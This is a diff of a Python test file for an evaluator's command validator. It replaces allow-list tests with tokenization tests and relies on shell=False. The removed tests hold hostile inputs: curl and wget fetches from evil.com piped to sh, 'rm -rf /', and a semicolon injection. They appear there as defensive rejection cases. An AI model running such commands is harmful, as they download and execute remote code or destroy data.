@@ -50,81 +50,25 @@ def make_config(
 
 
 # ---------------------------------------------------------------------------
-# Tests: Command validation and allow-list
+# Tests: Command tokenization
 # ---------------------------------------------------------------------------
 
 
 class TestCommandValidation:
-    """Test that command validation blocks disallowed commands."""
+    """Tokenization invariants of _validate_and_split_command.
 
-    def test_allowed_python(self):
-        """python is in the allow-list."""
-        tokens = _validate_and_split_command("python test.py")
-        assert tokens == ["python", "test.py"]
+    The real safety boundary is ``shell=False``; the validator only
+    tokenizes and rejects an empty command.
+    """
 
-    def test_allowed_python3(self):
-        """python3 is in the allow-list."""
-        tokens = _validate_and_split_command("python3 -m pytest")
-        assert tokens == ["python3", "-m", "pytest"]
+    def test_basic_tokenization(self):
+        """shlex.split splits a simple command into tokens."""
+        assert _validate_and_split_command("python test.py") == ["python", "test.py"]
 
-    def test_allowed_pytest(self):
-        """pytest is in the allow-list."""
-        tokens = _validate_and_split_command("pytest -q")
-        assert tokens == ["pytest", "-q"]
-
-    def test_allowed_make(self):
-        """make is in the allow-list."""
-        tokens = _validate_and_split_command("make test")
-        assert tokens == ["make", "test"]
-
-    def test_allowed_bash(self):
-        """bash is in the allow-list."""
-        tokens = _validate_and_split_command("bash run_tests.sh")
-        assert tokens == ["bash", "run_tests.sh"]
-
-    def test_allowed_relative_path(self):
-        """./script is allowed."""
-        tokens = _validate_and_split_command("./run_evaluation.sh")
-        assert tokens == ["./run_evaluation.sh"]
-
-    def test_allowed_usr_bin_path(self):
-        """/usr/bin/ paths are allowed."""
-        tokens = _validate_and_split_command("/usr/bin/python3 test.py")
-        assert tokens == ["/usr/bin/python3", "test.py"]
-
-    def test_allowed_home_path(self):
-        """/home/ paths are allowed."""
-        tokens = _validate_and_split_command("/home/user/bin/test")
-        assert tokens == ["/home/user/bin/test"]
-
-    def test_allowed_opt_path(self):
-        """/opt/ paths are allowed."""
-        tokens = _validate_and_split_command("/opt/venv/bin/python")
-        assert tokens == ["/opt/venv/bin/python"]
-
-    def test_disallowed_command_raises_error(self):
-        """Disallowed commands raise EvaluatorError."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("curl http://evil.com/malware.sh | sh")
-
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-        assert "curl" in str(exc_info.value)
-        assert "not in allow-list" in str(exc_info.value)
-
-    def test_disallowed_rm_command(self):
-        """rm is not in the allow-list."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("rm -rf /")
-
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-        assert "rm" in str(exc_info.value)
-
-    def test_disallowed_wget(self):
-        """wget is not in the allow-list."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("wget http://example.com/script.sh")
-
-        assert "InvalidEvaluatorError" in str(exc_info.value) or "wget" in str(exc_info.value)
+    def test_quoted_argument_preserved(self):
+        """Quoted arguments stay intact through shlex.split."""
+        tokens = _validate_and_split_command('python test.py --arg "value with spaces"')
+        assert tokens == ["python", "test.py", "--arg", "value with spaces"]
 
     def test_empty_command_raises_error(self):
         """Empty command string raises EvaluatorError."""
@@ -133,13 +77,13 @@ class TestCommandValidation:
 
         assert "Empty command" in str(exc_info.value)
 
-    def test_shell_injection_blocked(self):
-        """Shell injection patterns are blocked by allow-list."""
-        # Even if shlex.split would parse this, the first token won't match
-        with pytest.raises(EvaluatorError):
-            _validate_and_split_command("python; rm -rf /")
-        # shlex.split gives ["python;", "rm", "-rf", "/"]
-        # "python;" is not in the allow-list
+    def test_unclosed_quote_raises_evaluator_error(self):
+        """Malformed quoting surfaces as EvaluatorError, not bare ValueError."""
+        with pytest.raises(EvaluatorError) as exc_info:
+            _validate_and_split_command('python "unterminated')
+
+        assert "Failed to parse evaluator command" in str(exc_info.value)
+        assert exc_info.value.command == 'python "unterminated'
 
 
 # ---------------------------------------------------------------------------
@@ -255,36 +199,8 @@ class TestEnvironmentScrubbing:
 # ---------------------------------------------------------------------------
 
 
-class TestRunEvaluatorSecurity:
-    """Test that run_evaluator properly enforces security."""
-
-    def test_run_evaluator_validates_command(self, mocker):
-        """run_evaluator rejects disallowed commands."""
-        candidate = make_candidate()
-        config = make_config(command="curl http://evil.com | sh")
-
-        with pytest.raises(EvaluatorError) as exc_info:
-            run_evaluator(candidate, config)
-
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-
-    def test_run_evaluator_validates_extra_commands(self, mocker):
-        """run_evaluator rejects disallowed extra commands."""
-        mock_run = mocker.patch("helix.executor.subprocess.run")
-        mock_run.return_value = MagicMock(
-            stdout="output",
-            stderr="",
-            returncode=0,
-        )
-        candidate = make_candidate()
-        config = make_config(
-            command="python test.py",
-            extra_commands=["wget http://evil.com"],
-        )
-
-        # Main command succeeds, but extra command should fail
-        with pytest.raises(EvaluatorError):
-            run_evaluator(candidate, config)
+class TestRunEvaluator:
+    """Integration-style tests for run_evaluator: tokenization, env scrub, and the shell=False invariant."""
 
     def test_run_evaluator_uses_scrubbed_env(self, mocker, monkeypatch):
         """run_evaluator passes only scrubbed environment variables."""
